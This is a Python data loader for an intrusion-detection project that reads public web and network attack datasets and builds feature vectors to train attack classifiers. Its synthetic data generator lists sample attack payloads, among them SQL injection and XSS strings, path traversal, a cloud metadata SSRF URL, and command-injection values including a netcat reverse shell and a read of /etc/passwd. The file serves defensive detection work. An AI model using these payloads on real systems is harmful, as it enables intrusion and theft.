#!/usr/bin/env python3
"""
MIRAGE Dataset Loader
=========================
Naval SWAVLAMBAN 2025 Challenge 3

Comprehensive loader for real-world security datasets:
- CSIC 2010 (HTTP Web Attacks)
- CICIDS2017 (Network Intrusion)
- CICDDoS2019 (DDoS Attacks)
- UNSW-NB15 (Network Attacks)
- CTU-13 (Botnet Traffic)

Author: MIRAGE Team
Date: December 2025
"""

import os
import sys
import re
import gzip
import tarfile
import zipfile
import logging
import hashlib
import urllib.request
from pathlib import Path
from typing import Dict, List, Tuple, Optional, Any, Union
from dataclasses import dataclass
import warnings

import numpy as np
import pandas as pd
from sklearn.preprocessing import StandardScaler, LabelEncoder, RobustScaler
from sklearn.model_selection import train_test_split

warnings.filterwarnings('ignore')
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("mirage.datasets")


# ============================================================================
# DATASET CONFIGURATIONS
# ============================================================================

@dataclass
class DatasetConfig:
    """Configuration for a dataset"""
    name: str
    category: str  # 'http' or 'network'
    url: str
    filename: str
    size_mb: float
    n_features: int
    description: str
    citation: str


DATASET_CONFIGS = {
    'csic_2010': DatasetConfig(
        name='CSIC 2010',
        category='http',
        url='http://www.isi.csic.es/dataset/dataset.zip',  # Official
        filename='csic_2010.zip',
        size_mb=15.0,
        n_features=50,  # After feature extraction
        description='HTTP web application attacks (SQLi, XSS, Buffer Overflow)',
        citation='Torrano-Gimenez et al. "HTTP Dataset CSIC 2010", CSIC 2010'
    ),
    'cicids_2017': DatasetConfig(
        name='CICIDS2017',
        category='network',
        url='https://www.unb.ca/cic/datasets/ids-2017.html',  # Manual download
        filename='cicids2017.csv',
        size_mb=500.0,
        n_features=78,
        description='Network intrusion detection (DoS, DDoS, Brute Force, Web Attacks)',
        citation='Sharafaldin et al. "Toward Generating a New Intrusion Detection Dataset", ICISSP 2018'
    ),
    'cicddos_2019': DatasetConfig(
        name='CICDDoS2019',
        category='network',
        url='https://www.unb.ca/cic/datasets/ddos-2019.html',  # Manual download
        filename='cicddos2019.csv',
        size_mb=2000.0,
        n_features=80,
        description='DDoS attack detection (13 attack types)',
        citation='Sharafaldin et al. "Developing Realistic DDoS Attack Dataset", IEEE CCNC 2019'
    ),
    'unsw_nb15': DatasetConfig(
        name='UNSW-NB15',
        category='network',
        url='https://research.unsw.edu.au/projects/unsw-nb15-dataset',  # Manual download
        filename='unsw_nb15.csv',
        size_mb=400.0,
        n_features=49,
        description='Modern network attacks (9 attack types)',
        citation='Moustafa & Slay "UNSW-NB15: A comprehensive data set for network IDS", MilCIS 2015'
    ),
    'ctu_13': DatasetConfig(
        name='CTU-13',
        category='network',
        url='https://www.stratosphereips.org/datasets-ctu13',  # Manual download
        filename='ctu13.csv',
        size_mb=100.0,
        n_features=14,
        description='Botnet traffic detection (7 botnet families)',
        citation='Garcia et al. "An empirical comparison of botnet detection methods", Computers & Security 2014'
    ),
}


# ============================================================================
# NETWORK FLOW FEATURE DEFINITIONS
# ============================================================================

# CICIDS2017 Feature Names (78 features)
CICIDS2017_FEATURES = [
    'Destination Port', 'Flow Duration', 'Total Fwd Packets', 'Total Backward Packets',
    'Total Length of Fwd Packets', 'Total Length of Bwd Packets', 'Fwd Packet Length Max',
    'Fwd Packet Length Min', 'Fwd Packet Length Mean', 'Fwd Packet Length Std',
    'Bwd Packet Length Max', 'Bwd Packet Length Min', 'Bwd Packet Length Mean',
    'Bwd Packet Length Std', 'Flow Bytes/s', 'Flow Packets/s', 'Flow IAT Mean',
    'Flow IAT Std', 'Flow IAT Max', 'Flow IAT Min', 'Fwd IAT Total', 'Fwd IAT Mean',
    'Fwd IAT Std', 'Fwd IAT Max', 'Fwd IAT Min', 'Bwd IAT Total', 'Bwd IAT Mean',
    'Bwd IAT Std', 'Bwd IAT Max', 'Bwd IAT Min', 'Fwd PSH Flags', 'Bwd PSH Flags',
    'Fwd URG Flags', 'Bwd URG Flags', 'Fwd Header Length', 'Bwd Header Length',
    'Fwd Packets/s', 'Bwd Packets/s', 'Min Packet Length', 'Max Packet Length',
    'Packet Length Mean', 'Packet Length Std', 'Packet Length Variance',
    'FIN Flag Count', 'SYN Flag Count', 'RST Flag Count', 'PSH Flag Count',
    'ACK Flag Count', 'URG Flag Count', 'CWE Flag Count', 'ECE Flag Count',
    'Down/Up Ratio', 'Average Packet Size', 'Avg Fwd Segment Size',
    'Avg Bwd Segment Size', 'Fwd Header Length.1', 'Fwd Avg Bytes/Bulk',
    'Fwd Avg Packets/Bulk', 'Fwd Avg Bulk Rate', 'Bwd Avg Bytes/Bulk',
    'Bwd Avg Packets/Bulk', 'Bwd Avg Bulk Rate', 'Subflow Fwd Packets',
    'Subflow Fwd Bytes', 'Subflow Bwd Packets', 'Subflow Bwd Bytes',
    'Init_Win_bytes_forward', 'Init_Win_bytes_backward', 'act_data_pkt_fwd',
    'min_seg_size_forward', 'Active Mean', 'Active Std', 'Active Max', 'Active Min',
    'Idle Mean', 'Idle Std', 'Idle Max', 'Idle Min'
]

# UNSW-NB15 Feature Names (49 features)
UNSW_NB15_FEATURES = [
    'srcip', 'sport', 'dstip', 'dsport', 'proto', 'state', 'dur', 'sbytes', 'dbytes',
    'sttl', 'dttl', 'sloss', 'dloss', 'service', 'Sload', 'Dload', 'Spkts', 'Dpkts',
    'swin', 'dwin', 'stcpb', 'dtcpb', 'smeansz', 'dmeansz', 'trans_depth',
    'res_bdy_len', 'Sjit', 'Djit', 'Stime', 'Ltime', 'Sintpkt', 'Dintpkt',
    'tcprtt', 'synack', 'ackdat', 'is_sm_ips_ports', 'ct_state_ttl',
    'ct_flw_http_mthd', 'is_ftp_login', 'ct_ftp_cmd', 'ct_srv_src', 'ct_srv_dst',
    'ct_dst_ltm', 'ct_src_ltm', 'ct_src_dport_ltm', 'ct_dst_sport_ltm',
    'ct_dst_src_ltm', 'attack_cat', 'Label'
]

# Attack categories mapping
CICIDS2017_ATTACKS = {
    'BENIGN': 0,
    'FTP-Patator': 1,
    'SSH-Patator': 1,
    'DoS slowloris': 2,
    'DoS Slowhttptest': 2,
    'DoS Hulk': 2,
    'DoS GoldenEye': 2,
    'Heartbleed': 3,
    'Web Attack – Brute Force': 4,
    'Web Attack – XSS': 5,
    'Web Attack – Sql Injection': 6,
    'Infiltration': 7,
    'Bot': 8,
    'PortScan': 9,
    'DDoS': 10,
}

UNSW_NB15_ATTACKS = {
    'Normal': 0,
    'Fuzzers': 1,
    'Analysis': 2,
    'Backdoor': 3,
    'DoS': 4,
    'Exploits': 5,
    'Generic': 6,
    'Reconnaissance': 7,
    'Shellcode': 8,
    'Worms': 9,
}


# ============================================================================
# HTTP FEATURE EXTRACTOR (For CSIC 2010)
# ============================================================================

class HTTPFeatureExtractor:
    """
    Extract features from raw HTTP requests (CSIC 2010 format)
    50-dimensional feature vector matching SecureFeatureExtractor
    """
    
    FEATURE_NAMES = [
        'total_length', 'path_length', 'query_length', 'body_length', 'header_length',
        'total_entropy', 'path_entropy', 'query_entropy', 'body_entropy',
        'special_char_ratio', 'uppercase_ratio', 'lowercase_ratio', 'digit_ratio',
        'whitespace_ratio', 'non_ascii_ratio', 'punctuation_ratio',
        'letter_ratio', 'alphanumeric_ratio', 'hex_char_ratio',
        'sql_keyword_count', 'xss_tag_count', 'xss_event_count', 'rce_indicator_count',
        'path_traversal_count', 'ssrf_indicator_count', 'encoding_layers',
        'quote_count', 'comment_indicator_count', 'null_byte_count',
        'unicode_escape_count', 'hex_encoding_count', 'base64_pattern_count',
        'bracket_depth', 'parenthesis_depth',
        'param_count', 'max_param_length', 'avg_param_length',
        'duplicate_param_count', 'nested_structure_depth',
        'url_count', 'ip_address_count', 'domain_count',
        'file_extension_count', 'protocol_count',
        'char_diversity', 'bigram_uniqueness', 'trigram_uniqueness',
        'longest_word_length', 'avg_word_length', 'word_count',
    ]
    
    SQL_KEYWORDS = {'select', 'union', 'insert', 'update', 'delete', 'drop', 'create',
                   'exec', 'execute', 'declare', 'cast', 'convert', 'table', 'from', 
                   'where', 'and', 'or', 'sleep', 'benchmark', 'waitfor', 'load_file',
                   'information_schema', 'sys', 'mysql', 'pg_', 'sqlite'}
    
    XSS_TAGS = {'script', 'img', 'svg', 'iframe', 'object', 'embed', 'video', 'audio',
               'body', 'input', 'form', 'a', 'link', 'style', 'div', 'marquee', 'details'}
    
    XSS_EVENTS = {'onerror', 'onload', 'onclick', 'onmouseover', 'onfocus', 'onblur',
                 'onsubmit', 'onchange', 'oninput', 'ontoggle', 'onstart', 'onbegin'}
    
    RCE_INDICATORS = {'system', 'exec', 'eval', 'passthru', 'shell_exec', 'popen',
                     '__import__', 'subprocess', 'os.system', 'child_process', 'spawn'}
    
    def __init__(self):
        self.n_features = len(self.FEATURE_NAMES)
        from collections import Counter
        self._counter = Counter
    
    def extract_from_http(self, http_request: str) -> np.ndarray:
        """Extract features from raw HTTP request"""
        # Parse HTTP request
        parts = self._parse_http_request(http_request)
        
        # Combine all parts for full payload analysis
        full_payload = parts.get('uri', '') + parts.get('body', '')
        
        return self.extract(full_payload)
    
    def _parse_http_request(self, raw: str) -> Dict[str, str]:
        """Parse raw HTTP request into components"""
        parts = {'method': '', 'uri': '', 'headers': {}, 'body': '', 'query': ''}
        
        try:
            lines = raw.split('\n')
            if not lines:
                return parts
            
            # Parse request line
            request_line = lines[0].strip()
            tokens = request_line.split(' ')
            if len(tokens) >= 2:
                parts['method'] = tokens[0]
                parts['uri'] = tokens[1]
                
                # Extract query string
                if '?' in parts['uri']:
                    parts['query'] = parts['uri'].split('?', 1)[1]
            
            # Find body (after empty line)
            body_start = -1
            for i, line in enumerate(lines):
                if line.strip() == '':
                    body_start = i + 1
                    break
            
            if body_start > 0 and body_start < len(lines):
                parts['body'] = '\n'.join(lines[body_start:])
            
        except Exception:
            pass
        
        return parts
    
    def extract(self, payload: str) -> np.ndarray:
        """Extract 50-dimensional feature vector"""
        features = np.zeros(self.n_features, dtype=np.float32)
        
        if not payload:
            return features
        
        payload = payload[:50000]
        payload_lower = payload.lower()
        n = len(payload)
        
        # Length features (0-4)
        features[0] = n
        features[1] = len(payload.split('?')[0]) if '?' in payload else n
        features[2] = len(payload.split('?')[1]) if '?' in payload else 0
        features[3] = len(payload) if not payload.startswith('/') else 0
        features[4] = sum(1 for c in payload if c in ':;,')
        
        # Entropy features (5-8)
        features[5] = self._entropy(payload)
        features[6] = self._entropy(payload.split('?')[0])
        features[7] = self._entropy(payload.split('?')[1] if '?' in payload else '')
        features[8] = features[5]
        
        # Character ratios (9-18)
        if n > 0:
            features[9] = sum(1 for c in payload if c in '!@#$%^&*()_+-=[]{}|;:\'",.<>?/\\~`') / n
            features[10] = sum(1 for c in payload if c.isupper()) / n
            features[11] = sum(1 for c in payload if c.islower()) / n
            features[12] = sum(1 for c in payload if c.isdigit()) / n
            features[13] = sum(1 for c in payload if c.isspace()) / n
            features[14] = sum(1 for c in payload if ord(c) > 127) / n
            features[15] = sum(1 for c in payload if c in '.,;:!?-\'\"()[]{}') / n
            features[16] = sum(1 for c in payload if c.isalpha()) / n
            features[17] = sum(1 for c in payload if c.isalnum()) / n
            features[18] = sum(1 for c in payload if c in '0123456789abcdefABCDEF') / n
        
        # Attack indicators (19-33)
        features[19] = sum(1 for kw in self.SQL_KEYWORDS if kw in payload_lower)
        features[20] = sum(1 for t in self.XSS_TAGS if f'<{t}' in payload_lower)
        features[21] = sum(1 for e in self.XSS_EVENTS if e in payload_lower)
        features[22] = sum(1 for i in self.RCE_INDICATORS if i in payload_lower)
        features[23] = payload_lower.count('../') + payload_lower.count('..\\')
        features[24] = sum(1 for i in ['localhost', '127.0.0.1', '169.254', '::1'] if i in payload_lower)
        features[25] = self._encoding_layers(payload)
        features[26] = payload.count("'") + payload.count('"') + payload.count('`')
        features[27] = payload_lower.count('--') + payload_lower.count('/*') + payload_lower.count('#')
        features[28] = payload_lower.count('%00') + payload.count('\x00')
        features[29] = payload_lower.count('\\u') + payload_lower.count('%u')
        features[30] = payload_lower.count('%') // 2
        features[31] = 1 if '==' in payload else 0
        features[32] = self._max_depth(payload, '<', '>')
        features[33] = self._max_depth(payload, '(', ')')
        
        # Structural features (34-43)
        features[34] = payload.count('&') + payload.count('=')
        if '=' in payload:
            params = payload.split('&')
            lengths = [len(p.split('=')[1]) if '=' in p else 0 for p in params]
            features[35] = max(lengths) if lengths else 0
            features[36] = np.mean(lengths) if lengths else 0
        features[37] = len(payload.split('&')) - len(set(p.split('=')[0] for p in payload.split('&') if '=' in p))
        features[38] = self._max_depth(payload, '{', '}') + self._max_depth(payload, '[', ']')
        features[39] = payload_lower.count('http://') + payload_lower.count('https://')
        features[40] = len(re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', payload))
        features[41] = payload.count('.com') + payload.count('.net') + payload.count('.org')
        features[42] = sum(1 for ext in ['.php', '.asp', '.jsp', '.cgi', '.py', '.sh'] if ext in payload_lower)
        features[43] = sum(1 for p in ['http:', 'https:', 'ftp:', 'file:', 'data:', 'javascript:'] if p in payload_lower)
        
        # Statistical features (44-49)
        features[44] = len(set(payload)) / n if n > 0 else 0
        features[45] = len(set(payload[i:i+2] for i in range(n-1))) / max(1, n-1)
        features[46] = len(set(payload[i:i+3] for i in range(n-2))) / max(1, n-2)
        words = payload.split()
        features[47] = max(len(w) for w in words) if words else 0
        features[48] = np.mean([len(w) for w in words]) if words else 0
        features[49] = len(words)
        
        return features
    
    def _entropy(self, text: str) -> float:
        if not text:
            return 0.0
        counter = self._counter(text)
        n = len(text)
        return -sum((c/n) * np.log2(c/n) for c in counter.values())
    
    def _encoding_layers(self, text: str) -> int:
        layers = 0
        if '%' in text:
            layers += 1
            if '%25' in text:
                layers += 1
        if '&#' in text:
            layers += 1
        if '\\u' in text or '\\x' in text:
            layers += 1
        return layers
    
    def _max_depth(self, text: str, open_c: str, close_c: str) -> int:
        max_d = curr = 0
        for c in text:
            if c == open_c:
                curr += 1
                max_d = max(max_d, curr)
            elif c == close_c:
                curr = max(0, curr - 1)
        return max_d


# ============================================================================
# DATASET LOADERS
# ============================================================================

class DatasetLoader:
    """
    Unified dataset loader for all security datasets
    """
    
    def __init__(self, data_dir: str = "./data/datasets"):
        self.data_dir = Path(data_dir)
        self.data_dir.mkdir(parents=True, exist_ok=True)
        self.http_extractor = HTTPFeatureExtractor()
    
    def load_csic_2010(self, 
                       normal_file: str = None,
                       anomalous_file: str = None,
                       max_samples: int = None) -> Tuple[np.ndarray, np.ndarray, List[str]]:
        """
        Load CSIC 2010 HTTP dataset
        
        Args:
            normal_file: Path to normalTrafficTraining.txt
            anomalous_file: Path to anomalousTrafficTest.txt
            max_samples: Maximum samples per class
            
        Returns:
            X: Feature matrix
            y: Labels (0=normal, 1=attack)
            categories: ['normal', 'attack']
        """
        logger.info("Loading CSIC 2010 dataset...")
        
        X_list = []
        y_list = []
        
        # Load normal traffic
        if normal_file and Path(normal_file).exists():
            normal_requests = self._parse_csic_file(normal_file)
            logger.info(f"  Loaded {len(normal_requests)} normal requests")
            
            for i, req in enumerate(normal_requests):
                if max_samples and i >= max_samples:
                    break
                features = self.http_extractor.extract_from_http(req)
                X_list.append(features)
                y_list.append(0)
        
        # Load anomalous traffic
        if anomalous_file and Path(anomalous_file).exists():
            anomalous_requests = self._parse_csic_file(anomalous_file)
            logger.info(f"  Loaded {len(anomalous_requests)} anomalous requests")
            
            for i, req in enumerate(anomalous_requests):
                if max_samples and i >= max_samples:
                    break
                features = self.http_extractor.extract_from_http(req)
                X_list.append(features)
                y_list.append(1)
        
        if not X_list:
            logger.warning("  No CSIC 2010 data loaded - files not found")
            return None, None, None
        
        X = np.array(X_list, dtype=np.float32)
        y = np.array(y_list, dtype=np.int32)
        
        # Handle NaN/Inf
        X = np.nan_to_num(X, nan=0.0, posinf=1e6, neginf=-1e6)
        
        logger.info(f"  CSIC 2010: {X.shape[0]} samples, {X.shape[1]} features")
        
        return X, y, ['normal', 'attack']
    
    def _parse_csic_file(self, filepath: str) -> List[str]:
        """Parse CSIC 2010 file format"""
        requests = []
        current_request = []
        
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                if line.startswith('GET ') or line.startswith('POST ') or line.startswith('PUT '):
                    if current_request:
                        requests.append('\n'.join(current_request))
                    current_request = [line.rstrip()]
                elif current_request:
                    current_request.append(line.rstrip())
            
            if current_request:
                requests.append('\n'.join(current_request))
        
        return requests
    
    def load_cicids2017(self,
                        csv_path: str = None,
                        max_samples: int = None,
                        balance: bool = True) -> Tuple[np.ndarray, np.ndarray, List[str]]:
        """
        Load CICIDS2017 network flow dataset
        
        Features are pre-extracted in CSV format (78 features)
        
        Args:
            csv_path: Path to CSV file (or directory with multiple CSVs)
            max_samples: Maximum samples to load
            balance: Whether to balance classes
            
        Returns:
            X: Feature matrix (n_samples, 78)
            y: Labels
            categories: Attack category names
        """
        logger.info("Loading CICIDS2017 dataset...")
        
        if csv_path is None:
            csv_path = self.data_dir / 'cicids2017'
        
        csv_path = Path(csv_path)
        
        # Load all CSV files
        dfs = []
        if csv_path.is_dir():
            for f in csv_path.glob('*.csv'):
                try:
                    df = pd.read_csv(f, low_memory=False)
                    dfs.append(df)
                    logger.info(f"  Loaded {f.name}: {len(df)} rows")
                except Exception as e:
                    logger.warning(f"  Failed to load {f.name}: {e}")
        elif csv_path.exists():
            dfs.append(pd.read_csv(csv_path, low_memory=False))
        
        if not dfs:
            logger.warning("  No CICIDS2017 data found")
            return None, None, None
        
        df = pd.concat(dfs, ignore_index=True)
        
        # Clean column names
        df.columns = df.columns.str.strip()
        
        # Handle infinity and NaN
        df.replace([np.inf, -np.inf], np.nan, inplace=True)
        df.dropna(inplace=True)
        
        # Get label column
        label_col = 'Label' if 'Label' in df.columns else df.columns[-1]
        
        # Encode labels
        le = LabelEncoder()
        y = le.fit_transform(df[label_col].astype(str))
        categories = list(le.classes_)
        
        # Get features (exclude label)
        feature_cols = [c for c in df.columns if c != label_col]
        
        # Select numeric columns only
        X_df = df[feature_cols].select_dtypes(include=[np.number])
        
        # Sample if needed
        if max_samples and len(X_df) > max_samples:
            if balance:
                # Stratified sampling
                indices = []
                for label in np.unique(y):
                    label_indices = np.where(y == label)[0]
                    n_sample = min(len(label_indices), max_samples // len(np.unique(y)))
                    indices.extend(np.random.choice(label_indices, n_sample, replace=False))
                indices = np.array(indices)
            else:
                indices = np.random.choice(len(X_df), max_samples, replace=False)
            
            X_df = X_df.iloc[indices]
            y = y[indices]
        
        X = X_df.values.astype(np.float32)
        X = np.nan_to_num(X, nan=0.0, posinf=1e6, neginf=-1e6)
        
        logger.info(f"  CICIDS2017: {X.shape[0]} samples, {X.shape[1]} features, {len(categories)} categories")
        
        return X, y, categories
    
    def load_unsw_nb15(self,
                       csv_path: str = None,
                       max_samples: int = None) -> Tuple[np.ndarray, np.ndarray, List[str]]:
        """
        Load UNSW-NB15 dataset
        
        Args:
            csv_path: Path to CSV file
            max_samples: Maximum samples
            
        Returns:
            X, y, categories
        """
        logger.info("Loading UNSW-NB15 dataset...")
        
        if csv_path is None:
            csv_path = self.data_dir / 'unsw_nb15'
        
        csv_path = Path(csv_path)
        
        # Load CSV files
        dfs = []
        if csv_path.is_dir():
            for f in csv_path.glob('*.csv'):
                try:
                    df = pd.read_csv(f, low_memory=False)
                    dfs.append(df)
                except Exception as e:
                    logger.warning(f"  Failed to load {f.name}: {e}")
        elif csv_path.exists():
            dfs.append(pd.read_csv(csv_path, low_memory=False))
        
        if not dfs:
            logger.warning("  No UNSW-NB15 data found")
            return None, None, None
        
        df = pd.concat(dfs, ignore_index=True)
        
        # Handle infinity and NaN
        df.replace([np.inf, -np.inf], np.nan, inplace=True)
        df.dropna(inplace=True)
        
        # Get label columns
        if 'attack_cat' in df.columns:
            label_col = 'attack_cat'
        elif 'Label' in df.columns:
            label_col = 'Label'
        else:
            label_col = df.columns[-1]
        
        # Encode labels
        le = LabelEncoder()
        y = le.fit_transform(df[label_col].astype(str))
        categories = list(le.classes_)
        
        # Get numeric features
        exclude_cols = [label_col, 'attack_cat', 'Label', 'label', 'srcip', 'dstip', 'Stime', 'Ltime']
        feature_cols = [c for c in df.columns if c not in exclude_cols]
        X_df = df[feature_cols].select_dtypes(include=[np.number])
        
        if max_samples and len(X_df) > max_samples:
            indices = np.random.choice(len(X_df), max_samples, replace=False)
            X_df = X_df.iloc[indices]
            y = y[indices]
        
        X = X_df.values.astype(np.float32)
        X = np.nan_to_num(X, nan=0.0, posinf=1e6, neginf=-1e6)
        
        logger.info(f"  UNSW-NB15: {X.shape[0]} samples, {X.shape[1]} features, {len(categories)} categories")
        
        return X, y, categories
    
    def load_cicddos2019(self,
                         csv_path: str = None,
                         max_samples: int = None) -> Tuple[np.ndarray, np.ndarray, List[str]]:
        """Load CICDDoS2019 dataset"""
        logger.info("Loading CICDDoS2019 dataset...")
        
        if csv_path is None:
            csv_path = self.data_dir / 'cicddos2019'
        
        # Same structure as CICIDS2017
        return self.load_cicids2017(csv_path, max_samples)
    
    def load_ctu13(self,
                   csv_path: str = None,
                   max_samples: int = None) -> Tuple[np.ndarray, np.ndarray, List[str]]:
        """Load CTU-13 botnet dataset"""
        logger.info("Loading CTU-13 dataset...")
        
        if csv_path is None:
            csv_path = self.data_dir / 'ctu13'
        
        csv_path = Path(csv_path)
        
        dfs = []
        if csv_path.is_dir():
            for f in csv_path.glob('*.csv'):
                try:
                    df = pd.read_csv(f, low_memory=False)
                    dfs.append(df)
                except:
                    pass
        elif csv_path.exists():
            dfs.append(pd.read_csv(csv_path, low_memory=False))
        
        if not dfs:
            logger.warning("  No CTU-13 data found")
            return None, None, None
        
        df = pd.concat(dfs, ignore_index=True)
        df.replace([np.inf, -np.inf], np.nan, inplace=True)
        df.dropna(inplace=True)
        
        # Label column
        label_col = 'Label' if 'Label' in df.columns else df.columns[-1]
        
        le = LabelEncoder()
        y = le.fit_transform(df[label_col].astype(str))
        categories = list(le.classes_)
        
        feature_cols = [c for c in df.columns if c != label_col]
        X_df = df[feature_cols].select_dtypes(include=[np.number])
        
        if max_samples and len(X_df) > max_samples:
            indices = np.random.choice(len(X_df), max_samples, replace=False)
            X_df = X_df.iloc[indices]
            y = y[indices]
        
        X = X_df.values.astype(np.float32)
        X = np.nan_to_num(X, nan=0.0, posinf=1e6, neginf=-1e6)
        
        logger.info(f"  CTU-13: {X.shape[0]} samples, {X.shape[1]} features, {len(categories)} categories")
        
        return X, y, categories
    
    def load_all_available(self, 
                           max_samples_per_dataset: int = 10000) -> Dict[str, Tuple]:
        """
        Load all available datasets
        
        Returns:
            Dict with dataset name as key and (X, y, categories) as value
        """
        datasets = {}
        
        # HTTP datasets
        csic_normal = self.data_dir / 'csic2010' / 'normalTrafficTraining.txt'
        csic_anomalous = self.data_dir / 'csic2010' / 'anomalousTrafficTest.txt'
        if csic_normal.exists() or csic_anomalous.exists():
            result = self.load_csic_2010(str(csic_normal), str(csic_anomalous), max_samples_per_dataset)
            if result[0] is not None:
                datasets['csic_2010'] = result
        
        # Network datasets
        for name, loader in [
            ('cicids2017', self.load_cicids2017),
            ('unsw_nb15', self.load_unsw_nb15),
            ('cicddos2019', self.load_cicddos2019),
            ('ctu13', self.load_ctu13),
        ]:
            try:
                result = loader(max_samples=max_samples_per_dataset)
                if result[0] is not None:
                    datasets[name] = result
            except Exception as e:
                logger.warning(f"Failed to load {name}: {e}")
        
        return datasets


# ============================================================================
# SYNTHETIC DATA GENERATOR (FALLBACK)
# ============================================================================

class SyntheticDataGenerator:
    """
    Generate synthetic training data when real datasets unavailable
    """
    
    # Attack payloads (subset for quick generation)
    SQLI = [
        "' OR 1=1--", "' UNION SELECT * FROM users--", 
        "'; DROP TABLE users;--", "' AND SLEEP(5)--",
        "1' AND '1'='1", "admin'--", "' OR ''='",
    ]
    
    XSS = [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>", "javascript:alert(1)",
        "<body onload=alert(1)>", "<input onfocus=alert(1) autofocus>",
    ]
    
    RCE = [
        "; ls -la", "| cat /etc/passwd", "&& whoami",
        "; nc -e /bin/sh 10.0.0.1 4444", "$(id)",
    ]
    
    PATH_TRAVERSAL = [
        "../../../etc/passwd", "....//....//etc/passwd",
        "..%2f..%2f..%2fetc/passwd", "/etc/passwd%00",
    ]
    
    SSRF = [
        "http://localhost/admin", "http://127.0.0.1:22/",
        "http://169.254.169.254/latest/meta-data/",
    ]
    
    BENIGN = [
        "search?q=hello+world", "api/users/123",
        "products?category=electronics&page=1",
        "name=John+Doe&email=john@example.com",
    ]
    
    def __init__(self):
        self.extractor = HTTPFeatureExtractor()
    
    def generate(self, samples_per_category: int = 500) -> Tuple[np.ndarray, np.ndarray, List[str]]:
        """Generate synthetic dataset"""
        categories = ['benign', 'sqli', 'xss', 'rce', 'path_traversal', 'ssrf']
        payloads_map = {
            'benign': self.BENIGN,
            'sqli': self.SQLI,
            'xss': self.XSS,
            'rce': self.RCE,
            'path_traversal': self.PATH_TRAVERSAL,
            'ssrf': self.SSRF,
        }
        
        X_list = []
        y_list = []
        
        for cat_idx, category in enumerate(categories):
            payloads = payloads_map[category]
            for i in range(samples_per_category):
                payload = payloads[i % len(payloads)]
                # Add variations
                if np.random.random() > 0.5:
                    payload = payload.upper()
                if np.random.random() > 0.7:
                    import urllib.parse
                    payload = urllib.parse.quote(payload)
                
                features = self.extractor.extract(payload)
                X_list.append(features)
                y_list.append(cat_idx)
        
        X = np.array(X_list, dtype=np.float32)
        y = np.array(y_list, dtype=np.int32)
        X = np.nan_to_num(X, nan=0.0, posinf=1e6, neginf=-1e6)
        
        return X, y, categories


# ============================================================================
# MAIN
# ============================================================================

if __name__ == '__main__':
    print("MIRAGE Dataset Loader")
    print("=" * 60)
    
    loader = DatasetLoader(data_dir='./data/datasets')
    
    # Try to load available datasets
    datasets = loader.load_all_available(max_samples_per_dataset=5000)
    
    if datasets:
        print("\nLoaded datasets:")
        for name, (X, y, cats) in datasets.items():
            print(f"  {name}: {X.shape[0]} samples, {X.shape[1]} features, {len(cats)} categories")
    else:
        print("\nNo real datasets found. Generating synthetic data...")
        gen = SyntheticDataGenerator()
        X, y, cats = gen.generate(samples_per_category=500)
        print(f"  Generated: {X.shape[0]} samples, {X.shape[1]} features, {len(cats)} categories")
